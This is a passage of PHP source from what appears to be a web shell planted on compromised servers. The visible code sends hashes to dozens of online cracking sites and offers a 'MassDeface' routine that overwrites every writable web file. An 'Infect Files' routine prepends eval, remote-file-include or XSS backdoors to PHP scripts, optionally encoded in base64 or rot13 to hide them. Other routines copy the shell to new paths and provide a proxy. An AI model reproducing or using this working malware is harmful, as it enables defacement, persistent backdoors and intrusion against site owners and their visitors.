				<td><form action="http://md5.ip-domain.com.cn/index.htm" method="post" target="_blank" style="display:inline;"><input type="hidden" id="text" name="text" value="',$_POST['Plain'],'" /><input type="submit" value="md5.ip-domain.com.cn" style="width:150px;" /></form></td>
				<td><form action="http://passcracking.com/" method="post" target="_blank" style="display:inline;"><input type="hidden" id="datafromuser" name="datafromuser" value="',$_POST['Plain'],'" /><input type="submit" value="passcracking.com" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://md5.hashcracking.com/search.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="md5" name="md5" value="',$_POST['Plain'],'" /><input type="submit" value="md5.hashcracking.com" style="width:150px;" /></form></td>
				<td><form action="http://gdataonline.com/qkhash.php?" method="get" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" id="mode" name="mode" value="txt" /><input type="submit" value="gdataonline.com" style="width:150px;" /></form></td>
				<td><form action="http://milw0rm.com/cracker/search.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="milw0rm.com" style="width:150px;" /></form></td>
				<td><form action="http://md5decryption.com" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" name="submit" id="submit" value="Decrypt It!" /><input type="submit" value="md5decryption.com" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://www.hashchecker.com/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="search_text" name="search_field" value="',$_POST['Plain'],'" /><input type="submit" value="www.hashchecker.com" style="width:150px;" /></form></td>
				<td><form action="http://victorov.su/md5/" method="get" target="_blank" style="display:inline;"><input type="hidden" id="md5d" name="md5d" value="',$_POST['Plain'],'" /><input type="submit" value="victorov.su" style="width:150px;" /></form></td>
				<td><form action="http://md5.web-max.ca/" method="post" target="_blank" style="display:inline;"><input type="hidden" id="string" name="string" value="',$_POST['Plain'],'" /><input type="submit" value="md5.web-max.ca" style="width:150px;" /></form></td>
				<td><form action="http://www.md5decrypter.com/" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="www.md5decrypter.com" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://www.cmd5.org/default.aspx" method="post" target="_blank" style="display:inline;"><input type="hidden" id="ctl00_ContentPlaceHolder1_TextBoxq" name="ctl00$ContentPlaceHolder1$TextBoxq" value="',$_POST['Plain'],'" /><input type="hidden" id="ctl00_ContentPlaceHolder1_InputHashType" name="ctl00$ContentPlaceHolder1$InputHashType" value="md5" /><input type="hidden" id="ctl00_ContentPlaceHolder1_Button1" name="ctl00$ContentPlaceHolder1$Button1" value="decrypt" /><input type="submit" value="www.cmd5.org" style="width:150px;" /><input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" /><input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" /><input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="+MN0HB4uys9ziObtFE4Ft+HIiW08UancNKR49xRNHWX4eaHCdvMBaC6DNGHcmMrfMh5xteguu3qqukk0UT/UYJjrgyf66Va+DMAO0LBStlvSgsQEvC9d6/Ox/1TkfWT1ZFpKsUhzAXEKeMiKr11wAbIoevXIx4NlTHWWgGq4vC0O8lwEVTcMxe3tvzspwOJSkWIB6y2dhF03BsY4SnFWVNQRGie5uk+S/8XOHCoEFJ52Q3qOdiJdwT7NpZAGeequ3xv1Ey8TExuULC/QAUvnNovgW2SKzeZMO0HAGtLxrJoBFLUoSRrMqadlmYctIyOgLJ0H+J0vx5tyeOBzyg/Ar9LvTDUWVtHRW7XGnBs3hKhsgPyts1a16Q/hRLg0iWsXNvqvfvxYjpaJ1DUJR6nJ+vPos2Bk5V67din8BXGal0BqIhdXS5aOKFCaY1qP4cglpT5N77/Lti7IllKwEBmcVtQwKXqLHwTy+M2PMys+jrj9CzX7gFNSfx+11NDwDwYo8oAhMvyJjg02l0220cynmVOXbGViSLdSq/nTD2vYLnBHhlqvFpIzgrd/BqHK3sn6OsfCxMuiMZptMza7qB758OOSeJoDGwog/CqEaeVDPC1CYKMFmimws0Q2vtKs88zClZAV0ZYEN1B37z1efanzxghHeGceVx7PAn8SbyUlSeqmbabcs0hyHKLIIR8HZsiS6IRqgE0YPIEYATOuNGSBx6g5BlD+ExlRns1Dl75rZc2ZFTehef7IQzmjMNFt4mlYEdNT2Zc85+RrUQ9aeu5xqO1JhR8DtqxPdeRZc5KLDunwllh0mNiONuZBsGfMeZSjXiiG3ZdIrh7FDxQWxZvmJe+mIh68eiVr+ZIbFaL1RA8dau+o1SffU7sIzPVIRj/LNFvG/UfW8kbifWCO50u7EhDIgPgabYvPdoeDtJqCRWOHdpeep0+2Umz1Q6a6JaKxOpqfH01ePn7jncfwMfQaViaZ/luWfnzEVChO9YV5UtW0XAwK1af8U/zVFzaNv5+tqVd3UF1nCLCVHKAkgPyMHl64Ikk7W6YyBkDY6fjiXp6mm/yx7xHKt2iHBIZ6Qs6HjJYs2HLxYcji0wHHuue2WYuzFcBgBiJOYwZz11n4vov8TpBBcDehXkzz8bWvKw2XK3FE5ZoP3GVO4t+pSYgVvO6WbI1ZXx/jOtUtTChaNIe2Wt85axkyFFW/u7mg4mQlKweSkw9gjhWkL/JNSvaNqKglwAG1/RnWX5piAepRPnZ5bOHEWBvrvfcWWgrE+8+T+/N6N0dwUuU/+o0r5Blj9lxjg+zMfxjLJuWXky6z6N110RS1I8jhip9nFHD7teVxjZ9ZFZRid7YRJaM+eQzYKAry1Kyu+PXiu6+SKcpgbc0hQzd2TGxNb4bT4lB3YVteMQRZ/UUpZcC0Yfh4MAo3mEgspxYlC+Nre9vX8bl5UUWB+DelplSpmE+OImh5dhsLyAUlrS3cJ63wyjxmfjbeQ5W5IDb7c2dXmvK05dTunGFy5oc3OqoTzWphuwYRKiDaUd3NrAKAxNFweUm6cWAO4BR54LwLQEaFIySVHBUJybKbl9FHS1vP9Z/RNolbESnmXzokcugQclfDk0Eqrt5sE+Z6tLyL+QChQtZvuD4N67ghKxC4IoFpKg==" /></form></td>
				<td><form action="http://hashkiller.com/api/api.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="md5" name="md5" value="',$_POST['Plain'],'" /><input type="submit" value="hashkiller.com" style="width:150px;" /></form></td>
				<td><form action="http://www.md5crack.com/crackmd5.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="term" name="term" value="',$_POST['Plain'],'" /><input type="submit" value="www.md5crack.com" style="width:150px;" /></form></td>
				<td><form action="http://tools.benramsey.com/md5/md5.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="tools.benramsey.com" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://hashcrack.com/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="hashcrack.com" style="width:150px;" /></form></td>
				<td><form action="http://md5.allfact.info/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="decrypt" name="decrypt" value="',$_POST['Plain'],'" /><input type="hidden" name="act" id="act" value="decrypt" /><input type="submit" value="md5.allfact.info" style="width:150px;" /></form></td>
				<td><form action="http://blacklight.gotdns.org/cracker/mycracker.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" name="algo" id="algo" value="MD5" /><input type="submit" value="blacklight.gotdns.org" style="width:150px;" /></form></td>
				<td><form action="http://crackfor.me/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" name="act" id="act" value="find" /><input type="submit" value="crackfor.me" style="width:150px;" /></form></td></tr>
				<tr><tr><td><form action="http://schwett.com/md5/index.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="md5value" name="md5value" value="',$_POST['Plain'],'" /><input type="hidden" name="md5c" id="md5c" value="Hash Match" /><input type="submit" value="schwett.com" style="width:150px;" /></form></td>
				<td><form action="http://md5.rednoize.com/" method="get" target="_blank" style="display:inline;"><input type="hidden" id="q" name="q" value="',$_POST['Plain'],'" /><input type="hidden" name="s" id="s" value="md5" /><input type="submit" value="md5.rednoize.com" style="width:150px;" /></form></td>
				<td><form action="http://authsecu.com/decrypter-dechiffrer-cracker-hash-md5/script-hash-md5.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="champ2" name="champ2" value="',$_POST['Plain'],'" /><input type="submit" value="authsecu.com"0 style="width:150px;"></form></td>
				<td><form action="http://www.cloudcracker.net/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="inputbox" name="inputbox" value="',$_POST['Plain'],'" /><input type="submit" value="www.cloudcracker.net" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://cryptohaze.com/addhashes.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="sHashes" name="sHashes" value="',$_POST['Plain'],'" /><input type="hidden" name="iHashType" id="iHashType" value="1" /><input type="hidden" name="bAddHashes" id="bAddHashes" value="1" /><input type="hidden" name="format" id="format" value="1" /><input type="submit" value="cryptohaze.com" style="width:150px;" /></form></td>
				<td><form action="http://hash.insidepro.com/index.php?lang=eng" method="post" target="_blank" style="display:inline;"><input type="hidden" id="h1" name="h1" value="',$_POST['Plain'],'" /><input type="submit" value="hash.insidepro.com" style="width:150px;" /></form></td>
				<td><form action="http://hashfind.info/oldstuff/" method="post" target="_blank" style="display:inline;"><input type="hidden" id="textfield" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="hashfind.info" style="width:150px;" /></form></td>
				<td><form action="http://md5-db.de/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="md5" name="md5" value="',$_POST['Plain'],'" /><input type="submit" value="md5-db.de" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://md5.drasen.net/search.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="query" name="query" value="',$_POST['Plain'],'" /><input type="hidden" name="enter" id="enter" value="Generieren/Suchen" /><input type="submit" value="md5.drasen.net" style="width:150px;" /></form></td>
				<td><form action="http://md5.gromweb.com/query/',$_POST['Plain'],'" method="get" target="_blank" style="display:inline;"><input type="submit" value="md5.gromweb.com" style="width:150px;" /></form></td>
				<td><form action="http://md5.myinfosec.net/md5.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="md5hash" name="md5hash" value="',$_POST['Plain'],'" /><input type="submit" value="md5.myinfosec.net" style="width:150px;" /></form></td>
				<td><form action="http://md5.thekaine.de/" method="get" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="submit" value="md5.thekaine.de" style="width:150px;" /></form></td>
				<tr><td><form action="http://www.md5hood.com/index.php/cracker/crack" method="post" target="_blank" style="display:inline;"><input type="hidden" id="hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" name="submit" id="submit_search" value="Go" /><input type="submit" value="www.md5hood.com" style="width:150px;" /></form></td>
				<td><form action="http://md5online.net/" method="post" target="_blank" style="display:inline;"><input type="hidden" id="pass" name="pass" value="',$_POST['Plain'],'" /><input type="hidden" name="option" id="option" value="hash2text" /><input type="submit" value="md5online.net" style="width:150px;" /></form></td>
				<td><form action="http://netmd5crack.com/cgi-bin/Crack.py" method="get" target="_blank" style="display:inline;"><input type="hidden" id="InputHash" name="InputHash" value="',$_POST['Plain'],'" /><input type="submit" value="netmd5crack.com" style="width:150px;" /></form></td>
				<td><form action="http://shell-storm.org/md5/index.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="summd5" name="summd5" value="',$_POST['Plain'],'" /><input type="submit" value="shell-storm.org" style="width:150px;" /></form></td></tr>
				<tr><td><form action="http://tools.kerinci.net/?x=md5" method="post" target="_blank" style="display:inline;"><input type="hidden" id="md5hash" name="hash" value="',$_POST['Plain'],'" /><input type="hidden" name="search" id="search" value="Search" /><input type="submit" value="tools.kerinci.net" style="width:150px;" /></form></td>
				<td><form action="http://www.mmkey.com/md5/home.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="md5" name="md5" value="',$_POST['Plain'],'" /><input type="hidden" name="chkmd5" id="chkmd5" value="FIND" /><input type="hidden" name="lx" id="lx" value="chkmysql" /><input type="submit" value="www.mmkey.com" style="width:150px;" /></form></td>			
				<td><form action="http://www.md5-lookup.com/index.php" method="get" target="_blank" style="display:inline;"><input type="hidden" id="q" name="q" value="',$_POST['Plain'],'" /><input type="submit" value="www.md5-lookup.com" style="width:150px;" /></form></td>
				<td><form action="http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php" method="post" target="_blank" style="display:inline;"><input type="hidden" id="md5" name="md5" value="',$_POST['Plain'],'" /><input type="submit" value="md5.my-addr.com" style="width:150px;" /></form></td>
				</tr></table></fieldset>';
			}
		}
	}
	elseif ($_GET['action'] === 'search') {
		echo '<form action="?" method="get">
				Search for files and directories that their name
				<select id="type" name="type">
					<option value="exact"'; if ($_GET['type'] === 'exact') { echo ' selected="selected"'; } echo '>is</option>
					<option value="begins"'; if ($_GET['type'] === 'begins') { echo ' selected="selected"'; } echo '>begins with</option>
					<option value="nbegins"'; if ($_GET['type'] === 'nbegins') { echo ' selected="selected"'; } echo '>doesn\'t begin with</option>
					<option value="ends"'; if ($_GET['type'] === 'ends') { echo ' selected="selected"'; } echo '>ends with</option>
					<option value="nends"'; if ($_GET['type'] === 'nends') { echo ' selected="selected"'; } echo '>doesn\'t end with</option>
					<option value="nendsbegins"'; if ($_GET['type'] === 'nends') { echo ' selected="selected"'; } echo '>doesn\'t begin or end with</option>
					<option value="contains"'; if ($_GET['type'] === 'contains') { echo ' selected="selected"'; } echo '>contains</option>
					<option value="ncontains"'; if ($_GET['type'] === 'ncontains') { echo ' selected="selected"'; } echo '>excludes</option>
					<option value="lengthless"'; if ($_GET['type'] === 'lengthless') { echo ' selected="selected"'; } echo '>length is less than</option>
					<option value="lengthabove"'; if ($_GET['type'] === 'lengthabove') { echo ' selected="selected"'; } echo '>length is more than</option>
					<option value="regexp"'; if ($_GET['type'] === 'regexp') { echo ' selected="selected"'; } echo '>matches this Regexp</option>
				</select>
				<input type="text" size="40" id="search" name="search"'; if (isset($_GET['search'])) { echo ' value="',htmlspecialchars($_GET['search']),'"'; } echo ' /><br />
				Directory: <input type="text" size="40" id="dir" name="dir" value="',htmlspecialchars($CDIR),'" /><br /><br />
				<input type="checkbox" name="casein" id="casein"';if (isset($_GET['casein']) || !isset($_GET['search'])) { echo ' checked="checked"'; } echo ' /> case-insensitive
				<br /><br />
				On Windows, use //computername/share/filename or \\computername\share\filename to check files on network shares.
				<br /><br /><font color="red">Warning: The search may show false results due to Safe Mode restrictions!</font><br /><br />
				<input type="submit" value="Search!" />
			</form><br />';
	}
	/*elseif ($_GET['action'] === 'ManSQL') {
		if (isset($_POST['server']) && empty($_POST['server']) === FALSE) {
			if ($_POST['servertype'] === 'MySQL') {
				if (mysql_connect())
			})
			elseif ($_POST['servertype'] === 'MSSQL') {
			
			}
		}
		else {
			echo '<form action="" method="post"><h3>Connect To SQL Server:</h3>
			<input type="text" id="server" name="server" value="Server Name" onclick="javascript:if (this.value === \'Server Name\') this.value=\'\';" />
			<select id="servertype" name="servertype"><option value="MySQL">MySQL</option><option value="MSSQL">MSSQL</option><option value="PostgreSQL">PostgreSQL</option></select>
			<input type="submit" value="Connect" /></form>';
		}
		//echo '<table><tr><td></td><td><fieldset><legend>SQL Version</legend></fieldset></td></tr></table>';
	}*/
	elseif ($_GET['action'] === 'MassDeface') {
		if (isset($_POST['Opt1'])) {
			$Files = array();
			if (function_exists('scandir')) { $dir = scandir('.'); }
			elseif (function_exists('opendir') && function_exists('readdir')) { $Handle = opendir('.'); while (($File = readdir($Handle))) { $dir[$i++] = $File; } closedir($Handle); sort($dir); }
			else { $dir = glob('*'); }
			if ($_POST['type'] === 'All') { for ($i = 0, $k = 0, $Z = count($dir); $i < $Z; $i++) { if (is_file($dir[$i]) && is_writable($dir[$i])) { $Files[$k++] = $dir[$i]; } } }
			else {
				for ($i = 0, $k = 0, $Z = count($dir); $i < $Z; $i++) {
					$Ext = substr(strrchr(strtolower($dir[$i]), '.'), 1);
					if (is_file($dir[$i]) && is_writable($dir[$i]) && in_array($Ext,array('html','htm','xhtml','xht','xml','shtml','xhtm','php','phtml','php3','php4','php5','php6','phtm','phps','asp','asphtml','aspx','jsp','cfm','cfml','py','pl','cgi','rb','rhtml'),TRUE)) {
						$Files[$k++] = $dir[$i];
					}
				}
			}
			if (count($Files) === 0) { echo 'There are no writeable files in the directory'; if ($_POST['type'] !== 'All') { echo ' with a valid extension.'; } else { echo '.'; } echo '<br />'; }
			else {
				$Z = count($dir);
				if (function_exists('file_put_contents')) { for ($i = 0; $i <= $Z; $i++) { file_put_contents($Files[$i], $_POST['content']); } $Suc = TRUE; }
				elseif (function_exists('fopen') && function_exists('fwrite')) { for ($i = 0; $i <= $Z; $i++) { $Handle = fopen($Files[$i],'wb'); fwrite($Handle,$_POST['content']); fclose($Handle); } $Suc = TRUE; }
				elseif (function_exists('fopen') && function_exists('fputs')) { for ($i = 0; $i <= $Z; $i++) { $Handle = fopen($Files[$i],'wb'); fputs($Handle,$_POST['content']); fclose($Handle); } $Suc = TRUE; }
				elseif (function_exists('fopen') && function_exists('fputcsv')) { for ($i = 0; $i <= $Z; $i++) { $Handle = fopen($Files[$i],'wb'); fputcsv($Handle,array($_POST['content'])); fclose($Handle); } $Suc = TRUE; }
				
				if (!isset($Suc)) { echo 'Could not deface files. (No available functions)<br />'; }
				else { echo 'Files defaced successfully.<br />'; }
			}
		}
		else if (isset($_POST['Opt2'])) {
			if (!empty($_POST['vuln'])) {
				$dir = array();
				if (isset($_POST['filename'])) { $dir[0] = $_POST['filename']; }
				else {
					if (function_exists('scandir')) { $dir = scandir($CDIR); }
					elseif (function_exists('glob')) { $dir = glob($CDIR); $GLOB = TRUE; }
					elseif (function_exists('opendir') && function_exists('readdir')) { $j = 0; $Handle = opendir($CDIR); while (($File = readdir($Handle))) { $dir[$j++] = $File; } closedir($Handle); }
				}
				$FilesCount = 0; $Files = array();
				if (count($dir) !== 0) {
					foreach ($dir AS $FILE) {
						if (is_file($FILE)) {
							$Ext = substr(strrchr(strtolower($FILE), '.'), 1);
							if (in_array($Ext,array('php','phtml','php3','php4','php5','php6','phtm','phps'),TRUE)) { $Files[$FilesCount++] = $FILE; }
						}
					}
				}
				else { echo 'There are no files or sub-directories in this directory.<br />'; }
				if (count($Files) === 0) { echo 'There are no PHP scripts in the directory.<br />'; }
				if (!function_exists('file_get_contents') && (function_exists('fopen') && (function_exists('fread') || function_exists('fgets') || function_exists('fgetc')))) {
					if (function_exists('fread')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = fread($handle,sprintf('%u',filesize($File)));
							fclose($handle);
							return $contents;
						}
					}
					elseif (function_exists('fgets')) {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Line = '';
							do {
								$Line = fgets($handle,sprintf('%u',filesize($File)));
								$contents .= $Line;
							} while ($Line !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
					else {
						function file_get_contents($File) {
							$handle = fopen($File, 'rb');
							$contents = ''; $Character = '';
							do {
								$Character = fgetc($handle,sprintf('%u',filesize($File)));
								$contents .= $Character;
							} while ($Character !== FALSE);
							fclose($handle);
							return $contents;
						}
					}
				}
				else { $FilesCount = 0; echo 'Could not read files (no available functions).'; }
				if (!function_exists('file_put_contents') && (function_exists('fopen') && (function_exists('fputs') || function_exists('fwrite') || function_exists('fputcsv')))) {
					if (function_exists('fwrite')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							fwrite($handle,$StringT);
							fclose($handle);
						}
					}
					elseif (function_exists('fputs')) {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							fputs($handle,$StringT);
							fclose($handle);
						}
					}
					else {
						function file_get_contents($File,$StringT) {
							$handle = fopen($File, 'wb');
							fputcsv($handle,array($StringT));
							fclose($handle);
						}
					}
				}
				else { $FilesCount = 0; echo 'Could not write to files (no available functions).'; }
				$AVuln = '';
				if ($_POST['vuln'] === 'RFII') { $AVuln = 'if(@function_exists(\'include\')) {@include($_POST[\'c37\']); } elseif(@function_exists(\'include_once\')) {@include_once($_POST[\'c37\']); }'; }
				elseif ($_POST['vuln'] === 'RFIR') { $AVuln = 'if(@function_exists(\'require\')) {@include($_POST[\'c37\']); } elseif(@function_exists(\'require_once\')) {@require_once($_POST[\'c37\']); }'; }
				elseif ($_POST['vuln'] === 'RFIB') { $AVuln = 'if(@function_exists(\'include\')) {@include($_POST[\'c37\']); } elseif(@function_exists(\'include_once\')) {@include_once($_POST[\'c37\']); } elseif(@function_exists(\'require\')) {@require($_POST[\'c37\']); } elseif(@function_exists(\'require_once\')) {@require_once($_POST[\'c37\']); }'; }
				elseif ($_POST['vuln'] === 'XSS') { $AVuln = 'echo $_POST[\'c37\'];'; }
				elseif ($_POST['vuln'] === 'Eval') { $AVuln = '@eval($_POST[\'c37\']);'; }
				elseif ($_POST['vuln'] === 'My' && !empty($_POST['mycode'])) { $AVuln = $_POST['mycode']; }
				else { echo 'Please select a valid vulnerability.<br />'; $FilesCount = 0; }
				if (function_exists('eval')) {
					if ($_POST['encode'] === 'Base64' && function_exists('base64_encode') && function_exists('base64_decode')) { $AVuln = '@eval(@base64_decode(\''.base64_encode($AVuln).'\'));'; }
					elseif ($_POST['encode'] === 'Rot13' && function_exists('str_rot13')) { $AVuln = '@eval(@str_rot13(\''.str_rot13($AVuln).'\'));'; }
					elseif ($_POST['encode'] === 'UUEncode' && function_exists('convert_uuencode') && function_exists('convert_uudecode')) { $AVuln = '@eval(@convert_uudecode(\''.convert_uuencode($AVuln).'\'));'; }
					elseif ($_POST['encode'] === 'URLEncode' && function_exists('rawurldecode')) { $vulnlength = strlen($AVuln); $UrlencodedS = ''; for ($i = 0; $i < $vulnlength; $i++) { $UrlencodedS .= '%'.dechex(ord($AVuln[$i])); } $AVuln = '@eval(@rawurldecode(\''.$UrlencodedS.'\'));'; }
				}
				$VulnString = '<?php ' . $AVuln . ' ?>';
				for ($i = 0; $i<$FilesCount; $i++) {
					if (is_readable($Files[$i]) && is_writable($Files[$i])) {
						$FileContents = file_get_contents($Files[$i]);
						if (file_put_contents($Files[$i],$VulnString.$FileContents)) { echo '\'',$Files[$i],'\' infected.<br />'; }
						else { echo '<span style="color:red;">\'',htmlspecialchars($Files[$i]),'\' not infected.</span><br />'; }
					}
					else {
						echo '\'',htmlspecialchars($Files[$i]),'\' is not readable or is not writeable.<br />';
					}
				}
			}
		}
		echo '<h3>Change the content of the files in <span style="font-weight:normal;">',htmlspecialchars($CDIR),'</span> to:</h3>
			<form action="" method="post">
			<textarea name="content" id="content" cols="90" rows="15"></textarea><br /><br />
			Only affected web file extensions: html|htm|xhtml|xht|xml|shtml|xhtm|php|phtml|php3|php4|php5|php6|phtm|phps|asp|asphtml|aspx|jsp|cfm|cfml|py|pl|cgi|rb|rhtml
			<br /><br /><select id="type" name="type"><option value="Web">All web files (.html|.php|.rhtml|.asp etc)</option><option value="All">All files</option></select> <input type="submit" value="Deface" name="Opt1" id="Opt1" onclick="javascript:var Ans = confirm(\'Are you sure?\'); if (Ans == 0) { return false; } if (document.getElementById(\'content\').value === \'\') { var Ans = confirm(\'The textarea is empty, to continue?\'); if (Ans == 0) { return false; } }" /><br /><br />
			<h3>Infect Files</h3>Inject <select style="background-color:#1C1C1C;color:white;" onchange="javascript:if(this.value === \'My\') {document.getElementById(\'mycode\').removeAttribute(\'disabled\');document.getElementById(\'mycode\').style.display=\'inline\'; } else {document.getElementById(\'mycode\').setAttribute(\'disabled\',\'disabled\');document.getElementById(\'mycode\').style.display=\'none\'; }" name="vuln" id="vuln">
			<option value="RFII">RFI (include/_once)</option><option value="RFIR">RFI (require/_once)</option><option value="RFIB">RFI (both)</option><option value="XSS">XSS</option><option value="Eval">Eval</option><option value="My">My own infection</option></select> code to 
			<select style="background-color:#1C1C1C;color:white;" onchange="javascript:if(this.value === \'File\') {document.getElementById(\'filename\').removeAttribute(\'disabled\');document.getElementById(\'filename\').style.display=\'inline\'; } else {document.getElementById(\'filename\').setAttribute(\'disabled\',\'disabled\');document.getElementById(\'filename\').style.display=\'none\'; }">
				<option>All directory files</option>
				<option value="File">A file</option>
			</select> 
			<input type="text" name="filename" id="filename" size="19" disabled="disabled" style="display:none;" /> using encoding 
			<select style="background-color:#1C1C1C;color:white;" name="encode" id="encode">
				<option>None</option>';
				if(function_exists('base64_encode') && function_exists('base64_decode')) { echo '<option>Base64</option>'; }
				if (function_exists('str_rot13')) { echo '<option>Rot13</option>'; }
				if (function_exists('convert_uuencode') && function_exists('convert_uudecode')) { echo '<option value="UUEncode">UUEncode</option>'; }
				if (function_exists('rawurldecode')) { echo '<option value ="URLEncode">URLEncode</option>'; }
			echo '</select<br />
			<textarea id="mycode" name="mycode" rows="7" cols="60" style="display:none;" disabled="disabled" value="&lt;?php &amp;&amp; ?&gt; are added automatically"></textarea>
			<br /><br />
			Usage: example.php?<span style="color:red;">c37=&lt;script&gt;alert(\'XSS\');&lt;/script&gt;</span><br />
			If the encoding function or eval() does not exist, the infection encoding will be set to none.<br />
			Only affected extensions: php|phtml|php3|php4|php5|php6|phtm|phps
			<br /><br />
			<input type="submit" value="Infect" name="Opt2" id="Opt2" onclick="javascript:var Ans = confirm(\'Are you sure?\'); if (Ans == 0) { return false; }" />
			</form>';
	}
	elseif ($_GET['action'] === 'Replicator') {
		if (isset($_POST['file'])) {
			if (is_file($_POST['file']) || empty($_POST['file'])) { echo htmlspecialchars(realpath($_POST['file'])),' already exists or you did not provide a file location.<br /><br />'; }
			else {
				if (copy(__FILE__,$_POST['file'])) { echo 'Replicated successfully.'; $Suc = TRUE; }
			}
		}
		elseif (!isset($Suc)) { echo '<form method="post" action="">Replicate the shell to: <input type="text" name="file" id="file" value="',htmlspecialchars(__FILE__),'" size="40" /> <input type="submit" value="Replicate" /></form>'; }
	}
	elseif ($_GET['action'] === 'Proxy') {
		if (function_exists('curl_init') && function_exists('curl_exec') && function_exists('curl_setopt')) {
			$cURLinfo = curl_version();
			echo
			'
			<form action="?action=cURLframe" method="post" target="_blank">
				Go to: <input type="text" size="56" name="c37url" id="c37url" /> <input type="submit" value="Enter" />
			<br />
			<h3>Options</h3>
				User agent: <input type="text" name="UA" id="UA" size="40" value="Mozilla/5.0 (Windows; U; Windows NT 5.2; en-GB; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9" />
			</form>
			<br />
			This script uses cURL ',$cURLinfo['version'],
			' (',$cURLinfo['host'],')',
			', ',$cURLinfo['ssl_version'],
			' & zlib ',$cURLinfo['libz_version'],'.<br />',
			'Supported protocols: | ';
			foreach ($cURLinfo['protocols'] AS $Prot) {
				echo $Prot,' | ';
			}
		}
		else { echo '<span style="color:red">cURL is not available!</span><br /><br />'; }
	}
	elseif ($_GET['action'] === 'HashAnalyzer') {
		echo '<fieldset style="width:500px;"><legend>Hash Analyzer</legend><br /><form method="post" action=""><input type="text" size="45" name="hash" id="hash" size="40" value="'; if (isset($_POST['hash'])) { echo htmlspecialchars($_POST['hash']); } echo '" /> <input type="submit" value="Analyze" /></form>';
		if (isset($_POST['hash'])) {
			function CheckHEX($Hash, $Case) {
				if (preg_match('/^[0-9a-fA-F]+$/',$Hash)) { return 1; }
				else { return 0; }
			}
			function CheckBase64($Hash) {
				if (preg_match('/^[0-9a-zA-Z+\/.]+==$/',$Hash)) { return 1; }
				else { return 0; }		
			}
			
			echo '<h3>Possible Algorithms:</h3><ol style="text-align:left;width:125px;">';
			$StrLen = strlen($_POST['hash']);
			
			if ($StrLen === 32) {
				if (CheckHEX($_POST['hash'])) { echo '<li>MD5</li><li>MD4</li><li>MD2</li><li>NTLM</li><li>Tiger128</li><li>SNEFRU128</li><li>RipeMD128</li><li>Haval128_3</li><li>Haval128_4</li><li>Haval128_5</li><li>Domain Cached Credentials</li>'; }
				elseif (preg_match('/^[0-9A-F]+$/',$_POST['hash'])) { echo '<li>Windows-LM</li><li>Windows-NTLM</li><li>RC4</li>'; }
				elseif (preg_match('/^[0-9a-zA-Z+\/.]+$/',$_POST['hash'])) { echo '<li>Haval192 (Base64)</li><li>Tiger-192 (Base64)</li>'; }
			}
			elseif ($StrLen === 40) {
				if (CheckHEX($_POST['hash'])) { echo '<li>SHA-0</li><li>SHA-1</li><li>Tiger160</li><li>RipeMD160</li><li>MySQL v5.x</li><li>Haval160</li><li>Haval160_3</li><li>Haval160_4</li><li>Haval160_5</li>'; }
			}
			elseif ($StrLen === 8) {
				if (CheckHEX($_POST['hash'])) { echo '<li>ADLER32</li><li>CRC-32</li><li>CRC-32B</li><li>GHash-32-3</li><li>GHash-32-3</li>'; }
			}
			elseif ($StrLen === 13) {
				if (preg_match('/^[0-9a-zA-Z\/.]$/',$_POST['hash'])) { echo '<li>DES (Unix)</li>'; }
			}
			elseif ($StrLen === 16) {
				if (CheckHEX($_POST['hash'])) { echo '<li>MySQL</li>'; }
			}
			elseif ($StrLen === 4) {
				if (CheckHEX($_POST['hash'])) { echo '<li>CRC-16</li><li>CRC-16-CCITT</li><li>FCS-16</li>'; }
			}
			elseif ($StrLen === 34) {
				if (preg_match('/^\$1\$[0-9a-zA-Z\/.]{8}\$[0-9a-zA-Z\/.]{22} $/',$_POST['hash'])) { echo '<li>MD5 (Unix)</li>'; }
